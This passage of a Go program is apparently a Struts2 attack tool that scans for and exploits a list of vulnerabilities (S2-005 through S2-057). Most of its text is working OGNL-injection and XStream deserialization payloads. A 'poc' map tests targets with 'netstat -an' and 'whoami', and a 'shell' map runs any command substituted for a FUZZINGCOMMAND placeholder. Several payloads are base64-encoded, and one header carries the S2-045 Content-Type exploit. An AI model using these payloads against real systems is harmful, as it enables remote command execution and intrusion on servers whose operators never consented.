package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"flag"
	"fmt"
	"io"
	"io/ioutil"
	"mime/multipart"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"strings"
	"time"
)

var (
	URL string
	NAME string
	FILE string
)

func init()  {
	flag.StringVar(&URL,"u","","测试目标URL")
	flag.StringVar(&NAME,"n","","漏洞名称（执行shell）")
	flag.StringVar(&FILE, "f", "", "导入.txt文件批量检测")
}

var (
	header1 = map[string]string{
		"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
		"Accept" : "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
		"Content-Type" : "application/x-www-form-urlencoded",
	}

	header2 = map[string]string{
		"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
		"Accept" : "application/x-shockwave-flash, image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, application/vnd.ms-excel, application/vnd.ms-powerpoint, application/msword, */*",
		"Content-Type" : "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
	}

	header3 = map[string]string{
		"User-Agent" : "Mozilla/5.0 (Macintosh; Intel Mac OS X 11_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36",
		"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		"Content-Type" : "application/xml",
	}
)

var (
	//漏洞检测
	st2_005, _ = base64.StdEncoding.DecodeString("KCdcNDNfbWVtYmVyQWNjZXNzLmFsbG93U3RhdGljTWV0aG9kQWNjZXNzJykoYSk9dHJ1ZSYoYikoKCdcNDNjb250ZXh0W1wneHdvcmsuTWV0aG9kQWNjZXNzb3IuZGVueU1ldGhvZEV4ZWN1dGlvblwnXVw3NWZhbHNlJykoYikpJignXDQzYycpKCgnXDQzX21lbWJlckFjY2Vzcy5leGNsdWRlUHJvcGVydGllc1w3NUBqYXZhLnV0aWwuQ29sbGVjdGlvbnNARU1QVFlfU0VUJykoYykpJihnKSgoJ1w0M215Y21kXDc1XCduZXRzdGF0IC1hblwnJykoZCkpJihoKSgoJ1w0M215cmV0XDc1QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKFw0M215Y21kKScpKGQpKSYoaSkoKCdcNDNteWRhdFw3NW5ld1w0MGphdmEuaW8uRGF0YUlucHV0U3RyZWFtKFw0M215cmV0LmdldElucHV0U3RyZWFtKCkpJykoZCkpJihqKSgoJ1w0M215cmVzXDc1bmV3XDQwYnl0ZVs1MTAyMF0nKShkKSkmKGspKCgnXDQzbXlkYXQucmVhZEZ1bGx5KFw0M215cmVzKScpKGQpKSYobCkoKCdcNDNteXN0clw3NW5ld1w0MGphdmEubGFuZy5TdHJpbmcoXDQzbXlyZXMpJykoZCkpJihtKSgoJ1w0M215b3V0XDc1QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpJykoZCkpJihuKSgoJ1w0M215b3V0LmdldFdyaXRlcigpLnByaW50bG4oXDQzbXlzdHIpJykoZCkp")
	st2_013, _ = base64.StdEncoding.DecodeString("YT0xJHsoJTIzX21lbWJlckFjY2Vzc1siYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MiXT10cnVlLCUyM2E9QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKCduZXRzdGF0IC1hbicpLmdldElucHV0U3RyZWFtKCksJTIzYj1uZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlciglMjNhKSwlMjNjPW5ldytqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCUyM2IpLCUyM2Q9bmV3K2NoYXJbNTAwMDBdLCUyM2MucmVhZCglMjNkKSwlMjNzYnRlc3Q9QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldFdyaXRlcigpLCUyM3NidGVzdC5wcmludGxuKCUyM2QpLCUyM3NidGVzdC5jbG9zZSgpKX0=")
	st2_016, _ = base64.StdEncoding.DecodeString("cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN20ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2bGV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoJTI3bmV0c3RhdCUyMC1hbiUyNy50b1N0cmluZygpLnNwbGl0KCUyN1xccyUyNykpKS5zdGFydCgpLmdldElucHV0U3RyZWFtKCkpLnVzZURlbGltaXRlciglMjdcXEElMjcpLCUyM3N0ciUzZCUyM3MuaGFzTmV4dCgpPyUyM3MubmV4dCgpOiUyNyUyNywlMjNyZXNwJTNkJTIzY29udGV4dC5nZXQoJTI3Y28lMjclMmIlMjdtLm9wZW4lMjclMmIlMjdzeW1waG9ueS54d28lMjclMmIlMjdyazIuZGlzcCUyNyUyYiUyN2F0Y2hlci5IdHRwU2VyJTI3JTJiJTI3dmxldFJlcyUyNyUyYiUyN3BvbnNlJTI3KSwlMjNyZXNwLnNldENoYXJhY3RlckVuY29kaW5nKCUyN1VURi04JTI3KSwlMjNyZXNwLmdldFdyaXRlcigpLnByaW50bG4oJTIzc3RyKSwlMjNyZXNwLmdldFdyaXRlcigpLmZsdXNoKCksJTIzcmVzcC5nZXRXcml0ZXIoKS5jbG9zZSgpfQ==")
	st2_019, _ = base64.StdEncoding.DecodeString("ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeyduZXRzdGF0JywnLWFuJ30pKS5zdGFydCgpLCNiPSNhLmdldElucHV0U3RyZWFtKCksI2M9bmV3IGphdmEuaW8uSW5wdXRTdHJlYW1SZWFkZXIoI2IpLCNkPW5ldyBqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCNjKSwjZT1uZXcgY2hhclsxMDAwMF0sI2QucmVhZCgjZSksI3Jlc3AucHJpbnRsbigjZSksI3Jlc3AuY2xvc2UoKQ==")

	poc = map[string]string{
		"ST2_005" : string(st2_005),
		"ST2_008_1" : "?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%29)",
		"ST2_008_2" : "?debug=command&expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,%23cmd=\"netstat -an\",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[1000],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))",
		"ST2_009" : "class.classLoader.jarPath=%28%23context[\"xwork.MethodAccessor.denyMethodExecution\"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[\"allowStaticMethodAccess\"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]",
		"ST2_013" : string(st2_013),
		"ST2_016" : string(st2_016),
		"ST2_019" : string(st2_019),
		"ST2_devmode" : "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=netstat%20-an",
		"ST2_032" : "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=netstat -an&pp=____A&ppp=%20&encoding=UTF-8",
		"ST2_033" : "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=netstat -an",
		"ST2_037" : "/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=netstat -an",
		"ST2_048" : "name=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='netstat -an').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
		"ST2_052" : "<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"> <dataHandler> <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"> <is class=\"javax.crypto.CipherInputStream\"> <cipher class=\"javax.crypto.NullCipher\"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class=\"javax.imageio.spi.FilterIterator\"> <iter class=\"javax.imageio.spi.FilterIterator\"> <iter class=\"java.util.Collections$EmptyIterator\"/> <next class=\"java.lang.ProcessBuilder\"> <command> <string>whoami</string></command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class=\"javax.imageio.ImageIO$ContainsFilter\"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class=\"string\">foo</next> </serviceIterator> <lock/> </cipher> <input class=\"java.lang.ProcessBuilder$NullInputStream\"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/> <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/> </entry> </map> ",
		"ST2_053" : "%25%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23_memberAccess%3F%28%23_memberAccess%3D%23dm%29%3A%28%28%23container%3D%23context%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ognlUtil%3D%23container.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ognlUtil.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ognlUtil.getExcludedClasses%28%29.clear%28%29%29.%28%23context.setMemberAccess%28%23dm%29%29%29%29.%28%23cmd%3D%27netstat%20-an%27%29.%28%23iswin%3D%28@java.lang.System@getProperty%28%27os.name%27%29.toLowerCase%28%29.contains%28%27win%27%29%29%29.%28%23cmds%3D%28%23iswin%3F%7B%27cmd.exe%27%2C%27%2fc%27%2C%23cmd%7D%3A%7B%27%2fbin%2fbash%27%2C%27-c%27%2C%23cmd%7D%29%29.%28%23p%3Dnew%20java.lang.ProcessBuilder%28%23cmds%29%29.%28%23p.redirectErrorStream%28true%29%29.%28%23process%3D%23p.start%28%29%29.%28@org.apache.commons.io.IOUtils@toString%28%23process.getInputStream%28%29%29%29%7D",
		"struts2_057_1" : "/%24%7B%28%23_memberAccess%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23w%3D%23context.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D",
		"struts2_057_2" : "/%24%7B%28%23dm%3D@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28@com.opensymphony.xwork2.ognl.OgnlUtil@class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23w%3D%23ct.get%28%22com.opensymphony.xwork2.dispatcher.HttpServletResponse%22%29.getWriter%28%29%29.%28%23w.print%28@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27netstat -an%27%29.getInputStream%28%29%29%29%29.%28%23w.close%28%29%29%7D",
	}
)

var (
	//命令执行
	sts2_005, _ = base64.StdEncoding.DecodeString("KCdcNDNfbWVtYmVyQWNjZXNzLmFsbG93U3RhdGljTWV0aG9kQWNjZXNzJykoYSk9dHJ1ZSYoYikoKCdcNDNjb250ZXh0W1wneHdvcmsuTWV0aG9kQWNjZXNzb3IuZGVueU1ldGhvZEV4ZWN1dGlvblwnXVw3NWZhbHNlJykoYikpJignXDQzYycpKCgnXDQzX21lbWJlckFjY2Vzcy5leGNsdWRlUHJvcGVydGllc1w3NUBqYXZhLnV0aWwuQ29sbGVjdGlvbnNARU1QVFlfU0VUJykoYykpJihnKSgoJ1w0M215Y21kXDc1XCdGVVpaSU5HQ09NTUFORFwnJykoZCkpJihoKSgoJ1w0M215cmV0XDc1QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKFw0M215Y21kKScpKGQpKSYoaSkoKCdcNDNteWRhdFw3NW5ld1w0MGphdmEuaW8uRGF0YUlucHV0U3RyZWFtKFw0M215cmV0LmdldElucHV0U3RyZWFtKCkpJykoZCkpJihqKSgoJ1w0M215cmVzXDc1bmV3XDQwYnl0ZVs1MTAyMF0nKShkKSkmKGspKCgnXDQzbXlkYXQucmVhZEZ1bGx5KFw0M215cmVzKScpKGQpKSYobCkoKCdcNDNteXN0clw3NW5ld1w0MGphdmEubGFuZy5TdHJpbmcoXDQzbXlyZXMpJykoZCkpJihtKSgoJ1w0M215b3V0XDc1QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpJykoZCkpJihuKSgoJ1w0M215b3V0LmdldFdyaXRlcigpLnByaW50bG4oXDQzbXlzdHIpJykoZCkp")
	sts2_013, _ = base64.StdEncoding.DecodeString("YT0xJHsoJTIzX21lbWJlckFjY2Vzc1siYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MiXT10cnVlLCUyM2E9QGphdmEubGFuZy5SdW50aW1lQGdldFJ1bnRpbWUoKS5leGVjKCdGVVpaSU5HQ09NTUFORCcpLmdldElucHV0U3RyZWFtKCksJTIzYj1uZXcramF2YS5pby5JbnB1dFN0cmVhbVJlYWRlciglMjNhKSwlMjNjPW5ldytqYXZhLmlvLkJ1ZmZlcmVkUmVhZGVyKCUyM2IpLCUyM2Q9bmV3K2NoYXJbNTAwMDBdLCUyM2MucmVhZCglMjNkKSwlMjNzYnRlc3Q9QG9yZy5hcGFjaGUuc3RydXRzMi5TZXJ2bGV0QWN0aW9uQ29udGV4dEBnZXRSZXNwb25zZSgpLmdldFdyaXRlcigpLCUyM3NidGVzdC5wcmludGxuKCUyM2QpLCUyM3NidGVzdC5jbG9zZSgpKX0=")
	sts2_016, _ = base64.StdEncoding.DecodeString("cmVkaXJlY3Q6JHslMjNyZXElM2QlMjNjb250ZXh0LmdldCglMjdjbyUyNyUyYiUyN20ub3BlbiUyNyUyYiUyN3N5bXBob255Lnh3byUyNyUyYiUyN3JrMi5kaXNwJTI3JTJiJTI3YXRjaGVyLkh0dHBTZXIlMjclMmIlMjd2bGV0UmVxJTI3JTJiJTI3dWVzdCUyNyksJTIzcyUzZG5ldyUyMGphdmEudXRpbC5TY2FubmVyKChuZXclMjBqYXZhLmxhbmcuUHJvY2Vzc0J1aWxkZXIoJTI3RlVaWklOR0NPTU1BTkQlMjcudG9TdHJpbmcoKS5zcGxpdCglMjdcXHMlMjcpKSkuc3RhcnQoKS5nZXRJbnB1dFN0cmVhbSgpKS51c2VEZWxpbWl0ZXIoJTI3XFxBJTI3KSwlMjNzdHIlM2QlMjNzLmhhc05leHQoKT8lMjNzLm5leHQoKTolMjclMjcsJTIzcmVzcCUzZCUyM2NvbnRleHQuZ2V0KCUyN2NvJTI3JTJiJTI3bS5vcGVuJTI3JTJiJTI3c3ltcGhvbnkueHdvJTI3JTJiJTI3cmsyLmRpc3AlMjclMmIlMjdhdGNoZXIuSHR0cFNlciUyNyUyYiUyN3ZsZXRSZXMlMjclMmIlMjdwb25zZSUyNyksJTIzcmVzcC5zZXRDaGFyYWN0ZXJFbmNvZGluZyglMjdVVEYtOCUyNyksJTIzcmVzcC5nZXRXcml0ZXIoKS5wcmludGxuKCUyM3N0ciksJTIzcmVzcC5nZXRXcml0ZXIoKS5mbHVzaCgpLCUyM3Jlc3AuZ2V0V3JpdGVyKCkuY2xvc2UoKX0=")
	sts2_019, _ = base64.StdEncoding.DecodeString("ZGVidWc9Y29tbWFuZCZleHByZXNzaW9uPSNmPSNfbWVtYmVyQWNjZXNzLmdldENsYXNzKCkuZ2V0RGVjbGFyZWRGaWVsZCgnYWxsb3dTdGF0aWNNZXRob2RBY2Nlc3MnKSwjZi5zZXRBY2Nlc3NpYmxlKHRydWUpLCNmLnNldCgjX21lbWJlckFjY2Vzcyx0cnVlKSwjcmVxPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVxdWVzdCgpLCNyZXNwPUBvcmcuYXBhY2hlLnN0cnV0czIuU2VydmxldEFjdGlvbkNvbnRleHRAZ2V0UmVzcG9uc2UoKS5nZXRXcml0ZXIoKSwjYT0obmV3IGphdmEubGFuZy5Qcm9jZXNzQnVpbGRlcihuZXcgamF2YS5sYW5nLlN0cmluZ1tdeydGVVpaSU5HQ09NTUFORCd9KSkuc3RhcnQoKSwjYj0jYS5nZXRJbnB1dFN0cmVhbSgpLCNjPW5ldyBqYXZhLmlvLklucHV0U3RyZWFtUmVhZGVyKCNiKSwjZD1uZXcgamF2YS5pby5CdWZmZXJlZFJlYWRlcigjYyksI2U9bmV3IGNoYXJbMTAwMDBdLCNkLnJlYWQoI2UpLCNyZXNwLnByaW50bG4oI2UpLCNyZXNwLmNsb3NlKCk=")

	shell = map[string]string{
		"struts2-005" : string(sts2_005),
		"struts2-008-1" : "?debug=command&expression=(%23_memberAccess%5B%22allowStaticMethodAccess%22%5D%3Dtrue%2C%23foo%3Dnew%20java.lang.Boolean%28%22false%22%29%20%2C%23context%5B%22xwork.MethodAccessor.denyMethodExecution%22%5D%3D%23foo%2C@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%29)",
		"struts2-008-2" : "?debug=command&expression=(%23_memberAccess.allowStaticMethodAccess=true,%23context[\"xwork.MethodAccessor.denyMethodExecution\"]=false,%23cmd=\"FUZZINGCOMMAND\",%23ret=@java.lang.Runtime@getRuntime().exec(%23cmd),%23data=new+java.io.DataInputStream(%23ret.getInputStream()),%23res=new+byte[1000],%23data.readFully(%23res),%23echo=new+java.lang.String(%23res),%23out=@org.apache.struts2.ServletActionContext@getResponse(),%23out.getWriter().println(%23echo))",
		"struts2-009" : "class.classLoader.jarPath=%28%23context[\"xwork.MethodAccessor.denyMethodExecution\"]%3d+new+java.lang.Boolean%28false%29%2c+%23_memberAccess[\"allowStaticMethodAccess\"]%3dtrue%2c+%23a%3d%40java.lang.Runtime%40getRuntime%28%29.exec%28%27FUZZINGCOMMAND%27%29.getInputStream%28%29%2c%23b%3dnew+java.io.InputStreamReader%28%23a%29%2c%23c%3dnew+java.io.BufferedReader%28%23b%29%2c%23d%3dnew+char[50000]%2c%23c.read%28%23d%29%2c%23sbtest%3d%40org.apache.struts2.ServletActionContext%40getResponse%28%29.getWriter%28%29%2c%23sbtest.println%28%23d%29%2c%23sbtest.close%28%29%29%28meh%29&z[%28class.classLoader.jarPath%29%28%27meh%27%29]",
		"struts2-013" : string(sts2_013),
		"struts2-016" : string(sts2_016),
		"struts2-019" : string(sts2_019),
		"struts2-devmode" : "?debug=browser&object=(%23_memberAccess=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23context%5B%23parameters.rpsobj%5B0%5D%5D.getWriter().println(@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command%5B0%5D).getInputStream()))):sb.toString.json&rpsobj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&command=FUZZINGCOMMAND",
		"struts2-032" : "?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding[0]),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd[0]).getInputStream()).useDelimiter(%23parameters.pp[0]),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp[0],%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&cmd=FUZZINGCOMMAND&pp=____A&ppp=%20&encoding=UTF-8",
		"struts2-033" : "/%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23xx%3d123,%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr%3d%23context[%23parameters.obj[0]].getWriter(),%23wr.print(%23rs),%23wr.close(),%23xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=2908&command=FUZZINGCOMMAND",
		"struts2-037" : "/(%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)%3f(%23wr%3d%23context%5b%23parameters.obj%5b0%5d%5d.getWriter(),%23rs%3d@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(%23parameters.command[0]).getInputStream()),%23wr.println(%23rs),%23wr.flush(),%23wr.close()):xx.toString.json?&obj=com.opensymphony.xwork2.dispatcher.HttpServletResponse&content=16456&command=FUZZINGCOMMAND",
		"struts2-048" : "name=%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='FUZZINGCOMMAND').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}",
		"struts2-052" : "<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class=\"com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data\"> <dataHandler> <dataSource class=\"com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource\"> <is class=\"javax.crypto.CipherInputStream\"> <cipher class=\"javax.crypto.NullCipher\"> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class=\"javax.imageio.spi.FilterIterator\"> <iter class=\"javax.imageio.spi.FilterIterator\"> <iter class=\"java.util.Collections$EmptyIterator\"/> <next class=\"java.lang.ProcessBuilder\"> <command> <string>FUZZINGCOMMAND</string> </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class=\"javax.imageio.ImageIO$ContainsFilter\"> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class=\"string\">foo</next> </serviceIterator> <lock/> </cipher> <input class=\"java.lang.ProcessBuilder$NullInputStream\"/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference=\"../jdk.nashorn.internal.objects.NativeString\"/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/> <jdk.nashorn.internal.objects.NativeString reference=\"../../entry/jdk.nashorn.internal.objects.NativeString\"/> </entry> </map> ",
